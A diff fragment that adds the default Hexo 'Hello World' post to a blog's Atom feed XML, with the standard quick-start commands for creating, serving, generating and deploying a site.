+    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+</feed>
